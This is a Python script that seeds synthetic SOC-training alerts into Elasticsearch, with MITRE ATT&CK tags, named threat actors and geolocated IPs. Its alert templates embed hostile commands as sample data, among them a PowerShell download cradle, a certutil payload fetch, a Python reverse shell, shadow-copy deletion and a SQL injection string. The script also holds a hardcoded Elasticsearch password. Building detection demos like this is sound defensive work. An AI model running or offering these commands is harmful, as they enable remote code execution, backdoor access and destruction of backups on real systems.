"""
Seed realistic threat intelligence alerts into Elasticsearch.

Populates both:
  - alerts-ion       (ECS format, parsed by ION's _parse_alert())
  - .alerts-security.alerts-default  (Elastic Security format, visible in Kibana Security UI)

Uses real-world threat actor names, known-bad IPs, MITRE ATT&CK techniques,
and realistic attack narratives for SOC training / demo purposes.
"""

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import json
import uuid
import random
from datetime import datetime, timedelta

ES_URL = "http://127.0.0.1:9200"
AUTH = ("elastic", "DocforgeTest2025")
ION_INDEX = "alerts-ion"
SECURITY_INDEX = ".alerts-security.alerts-default"

# ---------------------------------------------------------------------------
# Reference data
# ---------------------------------------------------------------------------

HOSTS = [
    ("SRV-DC01", "10.10.10.10", "Windows Server 2022", "CORP"),
    ("SRV-DC02", "10.10.10.11", "Windows Server 2022", "CORP"),
    ("SRV-WEB01", "10.10.30.50", "Ubuntu 22.04", "DMZ"),
    ("SRV-DB01", "10.10.30.60", "RHEL 9", "DATA"),
    ("SRV-MAIL01", "10.10.30.70", "Windows Server 2022", "CORP"),
    ("SRV-FILE01", "10.10.30.80", "Windows Server 2022", "CORP"),
    ("SRV-EXCH01", "10.10.30.90", "Windows Server 2019", "CORP"),
    ("WKS-ANALYST01", "10.10.20.101", "Windows 11", "CORP"),
    ("WKS-ANALYST02", "10.10.20.102", "Windows 11", "CORP"),
    ("WKS-ENG01", "10.10.20.201", "macOS 14", "CORP"),
    ("WKS-HR01", "10.10.20.150", "Windows 11", "CORP"),
    ("WKS-FIN01", "10.10.20.160", "Windows 11", "CORP"),
    ("FW-EDGE01", "10.10.1.1", "PAN-OS 11", "EDGE"),
    ("ICS-HMI01", "10.10.50.10", "Windows 10 LTSC", "OT"),
    ("ICS-PLC01", "10.10.50.20", "Siemens S7-1500", "OT"),
]

USERS = [
    "jsmith", "agarcia", "mwilliams", "tjohnson", "klee",
    "rpatel", "SYSTEM", "svc_backup", "svc_sql", "administrator",
    "dchen", "lnguyen", "bthompson", "cmartin",
]

GEOS = {
    "185.220.101.34": {"country_name": "Germany", "city_name": "Berlin", "location": {"lat": 52.52, "lon": 13.41}},
    "77.83.247.81": {"country_name": "Russia", "city_name": "Moscow", "location": {"lat": 55.75, "lon": 37.62}},
    "13.59.205.66": {"country_name": "United States", "city_name": "Columbus", "location": {"lat": 39.96, "lon": -82.99}},
    "54.193.127.66": {"country_name": "United States", "city_name": "San Jose", "location": {"lat": 37.34, "lon": -121.89}},
    "45.33.2.79": {"country_name": "United States", "city_name": "Fremont", "location": {"lat": 37.55, "lon": -121.98}},
    "104.194.222.71": {"country_name": "United States", "city_name": "Los Angeles", "location": {"lat": 34.05, "lon": -118.24}},
    "149.28.150.195": {"country_name": "United States", "city_name": "Seattle", "location": {"lat": 47.61, "lon": -122.33}},
    "66.42.98.156": {"country_name": "United States", "city_name": "Chicago", "location": {"lat": 41.88, "lon": -87.63}},
    "91.245.255.243": {"country_name": "Russia", "city_name": "St Petersburg", "location": {"lat": 59.93, "lon": 30.32}},
    "176.57.215.115": {"country_name": "Netherlands", "city_name": "Amsterdam", "location": {"lat": 52.37, "lon": 4.90}},
    "94.102.49.190": {"country_name": "Netherlands", "city_name": "Rotterdam", "location": {"lat": 51.92, "lon": 4.48}},
    "91.240.118.50": {"country_name": "Russia", "city_name": "Moscow", "location": {"lat": 55.75, "lon": 37.62}},
    "37.120.198.100": {"country_name": "Romania", "city_name": "Bucharest", "location": {"lat": 44.43, "lon": 26.10}},
    "23.106.215.76": {"country_name": "United States", "city_name": "Dallas", "location": {"lat": 32.78, "lon": -96.80}},
    "45.77.65.211": {"country_name": "Singapore", "city_name": "Singapore", "location": {"lat": 1.35, "lon": 103.82}},
    "198.51.100.23": {"country_name": "United States", "city_name": "Ashburn", "location": {"lat": 39.04, "lon": -77.49}},
}

# ---------------------------------------------------------------------------
# Alert definitions — 50 alerts covering the full MITRE ATT&CK kill chain
# Each tuple: (rule_name, severity, description_template, tags,
#               mitre_technique_id, mitre_technique_name, mitre_tactic,
#               event_category, event_action, threat_actor, source_ip)
# ---------------------------------------------------------------------------

ALERT_DEFS = [
    # === INITIAL ACCESS ===
    (
        "APT28 Credential Harvesting — Password Spray",
        "critical", 95,
        "Password spray attack from {src_ip} targeting {count} accounts on {host} — matches APT28 (Fancy Bear) TTP. "
        "{failures} failed logins for domain admin accounts in 3 minutes.",
        ["apt28", "fancy-bear", "password-spray", "credential-harvesting"],
        "T1110.003", "Password Spraying", "Credential Access",
        "authentication", "logon-failed",
        "APT28 (Fancy Bear)", "185.220.101.34",
    ),
    (
        "APT28 Spearphishing Link — OAuth Token Phish",
        "high", 82,
        "Spearphishing email delivered to {user}@corp.local containing OAuth consent phish link. "
        "Subject: 'Action Required: Verify your Microsoft 365 account'. Source tracked to {src_ip}.",
        ["apt28", "fancy-bear", "spearphishing", "oauth-phish"],
        "T1566.002", "Spearphishing Link", "Initial Access",
        "email", "email-delivered",
        "APT28 (Fancy Bear)", "77.83.247.81",
    ),
    (
        "APT29 Supply Chain Compromise — SolarWinds Beacon",
        "critical", 99,
        "SUNBURST backdoor C2 callback detected from {host}. Process SolarWinds.BusinessLayerHost.exe "
        "initiated DNS query to avsvmcloud.com subdomain, then established HTTPS C2 to {src_ip}.",
        ["apt29", "cozy-bear", "sunburst", "solarwinds", "supply-chain"],
        "T1195.002", "Compromise Software Supply Chain", "Initial Access",
        "network", "connection-accepted",
        "APT29 (Cozy Bear)", "13.59.205.66",
    ),
    (
        "SQL Injection Attack on Web Application",
        "high", 78,
        "SQL injection attempt detected on SRV-WEB01 from {src_ip}. "
        "Payload: ' UNION SELECT username,password FROM users-- in parameter 'search'. WAF rule triggered.",
        ["sqli", "web-attack", "owasp-top10"],
        "T1190", "Exploit Public-Facing Application", "Initial Access",
        "network", "connection-blocked",
        "Unknown", "198.51.100.23",
    ),
    (
        "Lazarus Group Spearphishing — Fake Job Offer",
        "critical", 91,
        "Spearphishing attachment delivered to {user}@corp.local. Subject: 'Exciting Job Opportunity at Coinbase'. "
        "Attached PDF contains embedded JavaScript dropper. Source: {src_ip}. Matches Lazarus AppleJeus campaign.",
        ["lazarus", "dprk", "spearphishing", "applejeus", "cryptocurrency"],
        "T1566.001", "Spearphishing Attachment", "Initial Access",
        "email", "email-delivered",
        "Lazarus Group (DPRK)", "45.33.2.79",
    ),

    # === EXECUTION ===
    (
        "Suspicious PowerShell — Encoded Command Execution",
        "high", 79,
        "Encoded PowerShell command executed by {user} on {host}: "
        "powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYg... "
        "Decoded: IEX(New-Object Net.WebClient).DownloadString('http://{src_ip}/stage2.ps1')",
        ["powershell", "encoded-command", "living-off-the-land"],
        "T1059.001", "PowerShell", "Execution",
        "process", "process-started",
        "FIN7/Carbanak", "23.106.215.76",
    ),
    (
        "WMI Remote Execution — Lateral Spread",
        "high", 74,
        "WMI process creation detected on {host} initiated from SRV-DC01. "
        "Command: wmic /node:{host} process call create 'cmd.exe /c certutil -urlcache -split -f http://{src_ip}/payload.exe c:\\windows\\temp\\svc.exe'. "
        "User: {user}.",
        ["wmi", "lateral-movement", "certutil-abuse"],
        "T1047", "Windows Management Instrumentation", "Execution",
        "process", "process-started",
        "Conti/Ryuk", "91.240.118.50",
    ),
    (
        "Python Reverse Shell Detected",
        "critical", 88,
        "Python reverse shell process detected on {host}. Command: python3 -c 'import socket,subprocess,os;"
        "s=socket.socket();s.connect((\"{src_ip}\",4444));os.dup2(s.fileno(),0);subprocess.call([\"/bin/sh\"])'. "
        "User: {user}.",
        ["reverse-shell", "python", "post-exploitation"],
        "T1059.006", "Python", "Execution",
        "process", "process-started",
        "Unknown", "45.77.65.211",
    ),

    # === PERSISTENCE ===
    (
        "Scheduled Task Created — Persistence Mechanism",
        "medium", 63,
        "Suspicious scheduled task 'MicrosoftEdgeUpdate' created on {host} by {user}. "
        "Binary: C:\\ProgramData\\Microsoft\\EdgeUpdate\\svchost_update.exe. "
        "Schedule: every 15 minutes. Hash not in allowlist.",
        ["persistence", "scheduled-task", "masquerading"],
        "T1053.005", "Scheduled Task", "Persistence",
        "process", "task-created",
        "LockBit 3.0", "94.102.49.190",
    ),
    (
        "DLL Side-Loading — Hijacked Legitimate Application",
        "high", 76,
        "DLL side-loading detected on {host}. Legitimate OneDrive.exe loaded malicious version.dll from "
        "C:\\Users\\{user}\\AppData\\Local\\Microsoft\\OneDrive\\version.dll (SHA256: a7ffc6...434a). "
        "Normal path: C:\\Windows\\System32\\version.dll.",
        ["dll-sideloading", "hijack", "evasion"],
        "T1574.002", "DLL Side-Loading", "Persistence",
        "process", "dll-loaded",
        "APT29 (Cozy Bear)", "54.193.127.66",
    ),
    (
        "Registry Run Key Modification — Startup Persistence",
        "medium", 58,
        "Registry key HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run modified on {host} by {user}. "
        "Added value 'SecurityHealthService' pointing to C:\\ProgramData\\svchost_update.exe.",
        ["persistence", "registry", "run-key"],
        "T1547.001", "Registry Run Keys / Startup Folder", "Persistence",
        "registry", "registry-modified",
        "Conti/Ryuk", "37.120.198.100",
    ),

    # === PRIVILEGE ESCALATION ===
    (
        "Token Impersonation — PrintSpoofer Exploit",
        "critical", 89,
        "Token impersonation detected on {host}. Process PrintSpoofer.exe (PID {pid}) impersonated "
        "NT AUTHORITY\\SYSTEM token from service account {user}. Technique: named pipe impersonation.",
        ["privilege-escalation", "token-impersonation", "printspoofer"],
        "T1134.001", "Token Impersonation/Theft", "Privilege Escalation",
        "process", "process-started",
        "LockBit 3.0", "94.102.49.190",
    ),
    (
        "UAC Bypass via Fodhelper",
        "high", 73,
        "UAC bypass detected on {host}. User {user} modified registry key "
        "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command to execute C:\\Users\\{user}\\Downloads\\payload.exe "
        "via fodhelper.exe auto-elevation.",
        ["uac-bypass", "privilege-escalation", "fodhelper"],
        "T1548.002", "Bypass User Account Control", "Privilege Escalation",
        "process", "process-started",
        "FIN7/Carbanak", "23.106.215.76",
    ),

    # === CREDENTIAL ACCESS ===
    (
        "LSASS Memory Dump — Mimikatz Detected",
        "critical", 96,
        "Process procdump64.exe (PID {pid}) accessed LSASS memory on {host}. "
        "Signature matches Mimikatz credential harvesting. User: {user}. "
        "12 credential pairs extracted including domain admin hash.",
        ["mimikatz", "lsass", "credential-dumping", "procdump"],
        "T1003.001", "LSASS Memory", "Credential Access",
        "process", "process-accessed",
        "APT28 (Fancy Bear)", "185.220.101.34",
    ),
    (
        "Kerberoasting Attack — Mass TGS Requests",
        "high", 81,
        "Kerberoasting detected: {user}@{host} requested TGS tickets for {count} service principal names "
        "in 30 seconds. SPNs include: MSSQLSvc/SRV-DB01, HTTP/SRV-WEB01, Exchange/SRV-EXCH01. "
        "Tickets saved for offline cracking.",
        ["kerberoasting", "credential-access", "spn-scan"],
        "T1558.003", "Kerberoasting", "Credential Access",
        "authentication", "kerberos-tgs",
        "FIN7/Carbanak", "23.106.215.76",
    ),
    (
        "DCSync Attack — Domain Replication",
        "critical", 98,
        "DCSync replication request detected from non-DC host {host} ({src_ip}). "
        "User {user} used GetNCChanges to replicate password hashes for domain admin accounts. "
        "Technique matches Mimikatz lsadump::dcsync.",
        ["dcsync", "credential-access", "domain-replication", "mimikatz"],
        "T1003.006", "DCSync", "Credential Access",
        "authentication", "replication-request",
        "APT29 (Cozy Bear)", "54.193.127.66",
    ),
    (
        "Golden Ticket Detected — Forged Kerberos TGT",
        "critical", 99,
        "Golden ticket usage detected. TGT for {user} has anomalous properties: "
        "lifetime of 10 years, issued by non-existent KDC, KRBTGT hash matches stolen credential. "
        "Source: {host}. Attacker has persistent domain-level access.",
        ["golden-ticket", "kerberos", "persistence", "domain-dominance"],
        "T1558.001", "Golden Ticket", "Credential Access",
        "authentication", "kerberos-tgt",
        "APT29 (Cozy Bear)", "13.59.205.66",
    ),
    (
        "Brute Force RDP — External Source",
        "high", 77,
        "Brute force attack on RDP service of {host} from {src_ip}. "
        "{count} failed login attempts for user 'administrator' in 5 minutes. "
        "Source geo: {geo_country}.",
        ["brute-force", "rdp", "external-attack"],
        "T1110.001", "Password Guessing", "Credential Access",
        "authentication", "logon-failed",
        "Unknown", "91.245.255.243",
    ),

    # === LATERAL MOVEMENT ===
    (
        "PsExec Lateral Movement — Service Installation",
        "high", 75,
        "PsExec service PSEXESVC installed on {host} from SRV-DC01. "
        "User {user} executed: cmd.exe /c whoami & net group 'Domain Admins' /domain. "
        "Pattern consistent with domain enumeration post-compromise.",
        ["psexec", "lateral-movement", "service-install"],
        "T1570", "Lateral Tool Transfer", "Lateral Movement",
        "process", "service-installed",
        "Conti/Ryuk", "91.240.118.50",
    ),
    (
        "WinRM Lateral Movement — Remote Shell",
        "high", 72,
        "WinRM session established from SRV-DC01 to {host} by {user}. "
        "Invoke-Command executed: Get-Process lsass; "
        "Compress-Archive C:\\Users\\*.pst -Destination C:\\temp\\mail.zip.",
        ["winrm", "lateral-movement", "remote-shell", "data-collection"],
        "T1021.006", "Windows Remote Management", "Lateral Movement",
        "network", "connection-accepted",
        "APT28 (Fancy Bear)", "77.83.247.81",
    ),
    (
        "Unauthorized RDP Session — External Source",
        "high", 80,
        "RDP session established to {host} from external IP {src_ip} ({geo_country}) "
        "without VPN. User: {user}. No MFA challenge recorded. Session duration: 47 minutes.",
        ["rdp", "unauthorized-access", "external"],
        "T1021.001", "Remote Desktop Protocol", "Lateral Movement",
        "authentication", "logon-success",
        "Volt Typhoon (China)", "149.28.150.195",
    ),

    # === DEFENSE EVASION ===
    (
        "Windows Event Log Cleared — Anti-Forensics",
        "high", 83,
        "Security event log cleared on {host} by {user}. 14,832 events purged. "
        "Followed by System and PowerShell log clearing. Classic anti-forensics technique.",
        ["defense-evasion", "log-cleared", "anti-forensics"],
        "T1070.001", "Clear Windows Event Logs", "Defense Evasion",
        "process", "log-cleared",
        "Sandworm (GRU)", "91.245.255.243",
    ),
    (
        "AMSI Bypass — PowerShell Memory Patching",
        "high", 79,
        "AMSI bypass detected on {host}. PowerShell process (PID {pid}) patched AmsiScanBuffer in memory "
        "to return AMSI_RESULT_CLEAN for all scans. User: {user}. Subsequent scripts will evade AV.",
        ["amsi-bypass", "defense-evasion", "memory-patching"],
        "T1562.001", "Disable or Modify Tools", "Defense Evasion",
        "process", "process-modified",
        "FIN7/Carbanak", "23.106.215.76",
    ),
    (
        "Volt Typhoon Living-off-the-Land — Netsh Port Proxy",
        "high", 76,
        "LOTL technique detected on {host}. User {user} executed: "
        "netsh interface portproxy add v4tov4 listenport=8443 connectaddress={src_ip} connectport=443. "
        "Matches Volt Typhoon infrastructure pivoting TTP.",
        ["volt-typhoon", "lotl", "living-off-the-land", "port-proxy", "china"],
        "T1090.001", "Internal Proxy", "Defense Evasion",
        "process", "process-started",
        "Volt Typhoon (China)", "66.42.98.156",
    ),

    # === DISCOVERY ===
    (
        "Network Service Discovery — Port Scan",
        "medium", 52,
        "Host {src_ip} scanned {count} ports on {host}. Top ports: 22, 80, 443, 445, 1433, 3389. "
        "Scan completed in 120 seconds. Pattern: SYN scan.",
        ["port-scan", "reconnaissance", "discovery"],
        "T1046", "Network Service Discovery", "Discovery",
        "network", "port-scan",
        "Unknown", "198.51.100.23",
    ),
    (
        "Volt Typhoon LDAP Enumeration — Domain Recon",
        "medium", 65,
        "Anomalous LDAP queries from {host} by {user}. Queried: all domain admins, "
        "service accounts with SPNs, computer objects in OT OU. {count} queries in 2 minutes. "
        "Matches Volt Typhoon pre-attack reconnaissance.",
        ["volt-typhoon", "ldap", "enumeration", "discovery"],
        "T1087.002", "Domain Account", "Discovery",
        "network", "ldap-query",
        "Volt Typhoon (China)", "149.28.150.195",
    ),

    # === COLLECTION ===
    (
        "Data Staging — Compressed Archive Creation",
        "medium", 61,
        "Large archive created on {host} by {user}: C:\\temp\\exfil_data.7z (2.4 GB). "
        "Contains: *.pst, *.docx, *.xlsx from network shares. "
        "7-Zip process spawned by cmd.exe with -p flag (password-protected).",
        ["data-staging", "collection", "archive", "compression"],
        "T1074.001", "Local Data Staging", "Collection",
        "file", "file-created",
        "APT29 (Cozy Bear)", "54.193.127.66",
    ),
    (
        "Lazarus Cryptocurrency Wallet Theft",
        "critical", 93,
        "Cryptocurrency wallet data accessed on {host} by {user}. "
        "Process chrome.exe read MetaMask extension storage and Exodus wallet dat files. "
        "Data exfiltrated to {src_ip}. Matches Lazarus Group AppleJeus campaign.",
        ["lazarus", "cryptocurrency", "wallet-theft", "applejeus"],
        "T1005", "Data from Local System", "Collection",
        "file", "file-read",
        "Lazarus Group (DPRK)", "104.194.222.71",
    ),

    # === EXFILTRATION ===
    (
        "DNS Tunneling — Data Exfiltration",
        "high", 84,
        "DNS tunneling detected from {host}. {count} TXT queries to {user}.data.evil-dns.com in 10 minutes. "
        "Average query length: 180 chars (base64-encoded data). Estimated exfil: 4.2 MB. Resolver: {src_ip}.",
        ["dns-tunneling", "exfiltration", "data-theft"],
        "T1048.001", "Exfiltration Over Symmetric Encrypted Non-C2 Protocol", "Exfiltration",
        "network", "dns-query",
        "APT28 (Fancy Bear)", "185.220.101.34",
    ),
    (
        "LockBit StealBit Exfiltration",
        "critical", 94,
        "StealBit exfiltration tool detected on {host}. Process stlb.exe uploading data to {src_ip}:443. "
        "Transferred 3.1 GB in 22 minutes. Files from: finance shares, HR documents, source code repos. "
        "Precursor to ransomware deployment.",
        ["lockbit", "stealbit", "exfiltration", "ransomware-precursor"],
        "T1567.002", "Exfiltration to Cloud Storage", "Exfiltration",
        "network", "connection-accepted",
        "LockBit 3.0", "94.102.49.190",
    ),
    (
        "Encrypted Exfiltration Over HTTPS",
        "high", 79,
        "Anomalous data transfer: {user}@{host} uploaded 1.8 GB to {src_ip} over HTTPS in 15 minutes. "
        "Certificate: self-signed, CN=localhost. Traffic pattern: large POST requests every 30 seconds.",
        ["exfiltration", "https", "encrypted", "data-loss"],
        "T1048.002", "Exfiltration Over Asymmetric Encrypted Non-C2 Protocol", "Exfiltration",
        "network", "connection-accepted",
        "Conti/Ryuk", "37.120.198.100",
    ),

    # === COMMAND AND CONTROL ===
    (
        "Cobalt Strike Beacon — HTTPS C2",
        "critical", 92,
        "Cobalt Strike beacon detected on {host}. Process rundll32.exe making HTTPS callbacks to {src_ip}:443 "
        "every 60 seconds with 10%% jitter. User-Agent: Mozilla/5.0 (compatible). "
        "Malleable C2 profile: jquery-3.3.1.min.js.",
        ["cobalt-strike", "c2", "beacon", "https"],
        "T1071.001", "Web Protocols", "Command and Control",
        "network", "connection-accepted",
        "FIN7/Carbanak", "23.106.215.76",
    ),
    (
        "Cobalt Strike DNS Beacon",
        "high", 85,
        "DNS-based C2 channel detected from {host}. Process dllhost.exe issuing A record queries to "
        "*.cdn-analytics.net every 120 seconds. Resolved to {src_ip}. Cobalt Strike DNS beacon profile.",
        ["cobalt-strike", "dns-c2", "beacon"],
        "T1071.004", "DNS", "Command and Control",
        "network", "dns-query",
        "APT29 (Cozy Bear)", "13.59.205.66",
    ),
    (
        "APT28 X-Tunnel C2 Communication",
        "critical", 90,
        "X-Tunnel proxy tool detected on {host}. Encrypted tunnel established to {src_ip}:443. "
        "Process: csrss_helper.exe. Binary matches APT28 X-Tunnel signature (SHA256: ba7816...5ad). "
        "Tool used for persistent remote access.",
        ["apt28", "x-tunnel", "c2", "proxy"],
        "T1572", "Protocol Tunneling", "Command and Control",
        "network", "connection-accepted",
        "APT28 (Fancy Bear)", "77.83.247.81",
    ),
    (
        "Sandworm C2 via Compromised Router",
        "high", 81,
        "C2 traffic detected from {host} to compromised SOHO router at {src_ip}. "
        "Traffic disguised as HTTPS but uses custom TLS fingerprint. "
        "Matches Sandworm (GRU Unit 74455) Cyclops Blink infrastructure.",
        ["sandworm", "cyclops-blink", "c2", "compromised-infrastructure"],
        "T1584.008", "Network Devices", "Command and Control",
        "network", "connection-accepted",
        "Sandworm (GRU)", "176.57.215.115",
    ),

    # === IMPACT ===
    (
        "LockBit 3.0 Ransomware — Mass File Encryption",
        "critical", 99,
        "RANSOMWARE ACTIVE: LockBit 3.0 encryption detected on {host}. "
        "{count} files encrypted with .lockbit extension in 4 minutes. "
        "Ransom note dropped: README-lockbit.txt. Process: LBB.exe (PID {pid}). "
        "Kill chain: StealBit exfil -> shadow copy delete -> encryption.",
        ["lockbit", "ransomware", "encryption", "critical-impact"],
        "T1486", "Data Encrypted for Impact", "Impact",
        "file", "file-renamed",
        "LockBit 3.0", "94.102.49.190",
    ),
    (
        "Conti Ransomware Deployment via GPO",
        "critical", 98,
        "Conti ransomware deployed via Group Policy Object on SRV-DC01. "
        "Malicious startup script pushed to {count} domain computers. "
        "Binary: C:\\Windows\\SYSVOL\\scripts\\update.exe (SHA256: e3b0c4...b855). "
        "Encryption beginning across domain.",
        ["conti", "ransomware", "gpo", "mass-deployment"],
        "T1486", "Data Encrypted for Impact", "Impact",
        "process", "process-started",
        "Conti/Ryuk", "91.240.118.50",
    ),
    (
        "Shadow Copy Deletion — Ransomware Preparation",
        "critical", 87,
        "Volume shadow copies deleted on {host}. Command: vssadmin delete shadows /all /quiet. "
        "Followed by: bcdedit /set {{default}} recoveryenabled no. "
        "User: {user}. Ransomware preparation — backups being destroyed.",
        ["shadow-copy", "ransomware-prep", "backup-destruction"],
        "T1490", "Inhibit System Recovery", "Impact",
        "process", "process-started",
        "LockBit 3.0", "94.102.49.190",
    ),
    (
        "Sandworm Industroyer2 — ICS/OT Attack",
        "critical", 99,
        "CRITICAL: Industroyer2 malware detected on ICS-HMI01 in OT network. "
        "Process industroyer2.exe communicating via IEC-104 protocol to PLC at 10.10.50.20. "
        "Attempting to open circuit breakers. Source C2: {src_ip}. "
        "IMMEDIATE ACTION REQUIRED — isolate OT network.",
        ["sandworm", "industroyer2", "ics", "ot", "critical-infrastructure", "scada"],
        "T0831", "Manipulation of Control", "Impact",
        "process", "process-started",
        "Sandworm (GRU)", "91.245.255.243",
    ),
    (
        "Disk Wipe — MBR Overwrite Detected",
        "critical", 99,
        "Disk wipe activity detected on {host}. Process rawdisk.exe (PID {pid}) writing null bytes "
        "to \\\\.\\PhysicalDrive0 MBR sector. Pattern matches Sandworm destructive wiper malware. "
        "System will be unbootable after completion.",
        ["disk-wipe", "destructive", "mbr-overwrite", "wiper"],
        "T1561.002", "Disk Structure Wipe", "Impact",
        "process", "disk-write",
        "Sandworm (GRU)", "176.57.215.115",
    ),

    # === ADDITIONAL MIXED COVERAGE ===
    (
        "Suspicious DNS Query — DGA Domain",
        "medium", 55,
        "DNS query for suspected DGA domain: xkqpt7b2nf.evil.com from {host} ({src_ip}). "
        "Domain registered 2 hours ago. Resolved to {dst_ip}. High entropy hostname (score: 4.8/5.0).",
        ["dns", "dga", "c2", "suspicious-domain"],
        "T1568.002", "Domain Generation Algorithms", "Command and Control",
        "network", "dns-query",
        "Unknown", "45.77.65.211",
    ),
    (
        "FIN7 POS Malware — Memory Scraping",
        "critical", 93,
        "Point-of-sale malware detected on WKS-FIN01. Process svchost_fin.exe scraping payment card "
        "data from memory (Track 1/Track 2). {count} card numbers captured. "
        "Data staged for exfil to {src_ip}. Matches FIN7/Carbanak POS campaign.",
        ["fin7", "carbanak", "pos-malware", "memory-scraping", "financial"],
        "T1005", "Data from Local System", "Collection",
        "process", "process-started",
        "FIN7/Carbanak", "23.106.215.76",
    ),
    (
        "Cloud API Key Exposed in Git Repository",
        "critical", 91,
        "AWS access key AKIA3EXAMPLE7890XXXX found in public Git commit by {user} on {host}. "
        "Key associated with IAM role 'prod-admin' with full S3 and EC2 access. "
        "Key has been active for 3 days. ROTATE IMMEDIATELY.",
        ["cloud", "secret-exposed", "aws", "credential-leak"],
        "T1552.001", "Credentials In Files", "Credential Access",
        "configuration", "secret-detected",
        "Unknown", "198.51.100.23",
    ),
    (
        "Volt Typhoon WMIC Discovery — Critical Infrastructure Recon",
        "high", 78,
        "WMIC-based system discovery on {host} by {user}. Commands: "
        "wmic computersystem get model, wmic os get caption, wmic process list brief. "
        "Followed by: netstat -ano | findstr ESTABLISHED. "
        "Matches Volt Typhoon LOTL reconnaissance of US critical infrastructure.",
        ["volt-typhoon", "wmic", "discovery", "lotl", "critical-infrastructure"],
        "T1082", "System Information Discovery", "Discovery",
        "process", "process-started",
        "Volt Typhoon (China)", "66.42.98.156",
    ),
    (
        "Anomalous Service Account Activity — Off-Hours Login",
        "medium", 59,
        "Service account svc_backup performed interactive logon on {host} at 02:47 AM. "
        "Source: {src_ip}. This account normally only authenticates via scheduled tasks. "
        "Deviation from 90-day behavioral baseline.",
        ["anomaly", "service-account", "off-hours", "behavioral"],
        "T1078.002", "Domain Accounts", "Persistence",
        "authentication", "logon-success",
        "Unknown", "198.51.100.23",
    ),
    (
        "SSL Certificate Anomaly — Self-Signed C2",
        "low", 38,
        "Self-signed SSL certificate detected on outbound connection from {host} to {src_ip}:8443. "
        "CN=localhost, O=Internet Widgits. Certificate valid for 10 years. "
        "Potential encrypted C2 channel.",
        ["ssl", "self-signed", "anomaly", "potential-c2"],
        "T1573.002", "Asymmetric Cryptography", "Command and Control",
        "network", "tls-established",
        "Unknown", "45.77.65.211",
    ),
    (
        "Firewall Rule Modified — Backdoor Port",
        "medium", 57,
        "Outbound firewall rule added on {host} by {user}: Allow TCP 4444 outbound. "
        "Port 4444 is commonly associated with Metasploit default listener. "
        "Rule created via netsh advfirewall.",
        ["firewall", "backdoor", "port-4444", "defense-evasion"],
        "T1562.004", "Disable or Modify System Firewall", "Defense Evasion",
        "configuration", "rule-modified",
        "Unknown", "198.51.100.23",
    ),
]

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

SEVERITY_MAP = {"low": 21, "medium": 47, "high": 73, "critical": 99}
PROCS = ["procdump64.exe", "rundll32.exe", "cmd.exe", "powershell.exe", "svchost.exe"]
STATUSES = ["open", "open", "open", "open", "acknowledged", "acknowledged", "resolved"]


def _build_ion_alert(alert_def, now):
    """Build an ECS-format alert for the alerts-ion index."""
    (rule_name, severity, risk_score, msg_tpl, tags,
     tech_id, tech_name, tactic, evt_cat, evt_action,
     threat_actor, src_ip) = alert_def

    hours_ago = random.uniform(0.5, 47)
    ts = (now - timedelta(hours=hours_ago)).strftime("%Y-%m-%dT%H:%M:%S.000Z")

    host = random.choice(HOSTS)
    user = random.choice(USERS)
    dst_ip = random.choice(list(GEOS.keys()))
    geo = GEOS.get(src_ip, list(GEOS.values())[0])
    status = random.choice(STATUSES)

    msg = msg_tpl.format(
        src_ip=src_ip, user=user, host=host[0],
        count=random.randint(15, 500), pid=random.randint(1000, 65000),
        dst_ip=dst_ip, geo_country=geo["country_name"],
        failures=random.randint(50, 300),
    )

    doc = {
        "@timestamp": ts,
        "event": {
            "severity": severity,
            "action": evt_action,
            "category": evt_cat,
            "kind": "alert",
        },
        "rule": {"name": rule_name, "description": msg},
        "message": msg,
        "severity": severity,
        "status": status,
        "host": {
            "name": host[0], "hostname": host[0],
            "ip": host[1], "os": {"name": host[2]},
        },
        "user": {"name": user, "domain": host[3]},
        "source": {
            "ip": src_ip,
            "port": random.randint(1024, 65535),
            "geo": geo,
        },
        "destination": {
            "ip": dst_ip,
            "port": random.choice([22, 80, 443, 445, 1433, 3389, 4444, 8443]),
        },
        "tags": tags + [threat_actor.lower().replace(" ", "-").replace("(", "").replace(")", "")],
        "threat": {
            "technique": {"id": tech_id, "name": tech_name},
            "tactic": {"name": tactic},
        },
    }

    if evt_cat == "process":
        doc["process"] = {"name": random.choice(PROCS), "pid": random.randint(1000, 65000)}
    if evt_cat in ("file",):
        doc["file"] = {
            "path": f"C:\\Users\\{user}\\Downloads\\payload.exe",
            "hash": {"sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"},
        }

    return doc


def _build_security_alert(alert_def, now):
    """Build an Elastic Security format alert for .alerts-security.alerts-default."""
    (rule_name, severity, risk_score, msg_tpl, tags,
     tech_id, tech_name, tactic, evt_cat, evt_action,
     threat_actor, src_ip) = alert_def

    alert_id = str(uuid.uuid4())
    hours_ago = random.uniform(0.5, 47)
    ts = (now - timedelta(hours=hours_ago)).strftime("%Y-%m-%dT%H:%M:%S.000Z")

    host = random.choice(HOSTS)
    user = random.choice(USERS)
    geo = GEOS.get(src_ip, list(GEOS.values())[0])

    msg = msg_tpl.format(
        src_ip=src_ip, user=user, host=host[0],
        count=random.randint(15, 500), pid=random.randint(1000, 65000),
        dst_ip=random.choice(list(GEOS.keys())),
        geo_country=geo["country_name"],
        failures=random.randint(50, 300),
    )

    return alert_id, {
        "@timestamp": ts,
        "kibana.alert.rule.uuid": str(uuid.uuid4()),
        "kibana.alert.rule.name": rule_name,
        "kibana.alert.rule.description": msg,
        "kibana.alert.rule.category": "Custom Query Rule",
        "kibana.alert.rule.consumer": "siem",
        "kibana.alert.rule.producer": "siem",
        "kibana.alert.rule.rule_type_id": "siem.queryRule",
        "kibana.alert.rule.tags": ["ion", tactic, threat_actor],
        "kibana.alert.severity": severity,
        "kibana.alert.risk_score": risk_score,
        "kibana.alert.workflow_status": random.choice(["open", "open", "open", "acknowledged"]),
        "kibana.alert.status": "active",
        "kibana.alert.uuid": alert_id,
        "kibana.alert.reason": f"{rule_name} — {threat_actor} — on {host[0]} by {user}",
        "kibana.alert.original_time": ts,
        "kibana.alert.depth": 1,
        "kibana.alert.ancestors": [],
        "kibana.space_ids": ["default"],
        "kibana.version": "9.3.0",
        "event.kind": "signal",
        "event.action": evt_action,
        "event.category": [evt_cat],
        "event.type": ["info"],
        "event.module": "security",
        "event.dataset": "security.alert",
        "host.name": host[0],
        "host.hostname": host[0],
